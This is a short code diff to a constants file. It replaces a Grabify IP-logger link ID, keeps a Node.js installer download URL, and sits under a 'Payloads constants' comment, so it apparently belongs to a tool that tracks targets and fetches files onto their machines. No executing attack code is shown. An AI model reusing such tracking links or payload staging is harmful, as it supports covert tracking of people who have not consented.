@@ -1,5 +1,5 @@
 # URL:
-URL_GRABIFY_LINK: str = "https://grabify.link/D5TUJA"
+URL_GRABIFY_LINK: str = "https://grabify.link/L6IZF4"
 URL_DOWNLOAD_FILE: str = "https://nodejs.org/dist/v20.12.1/node-v20.12.1-x64.msi"
 
 # Payloads constants
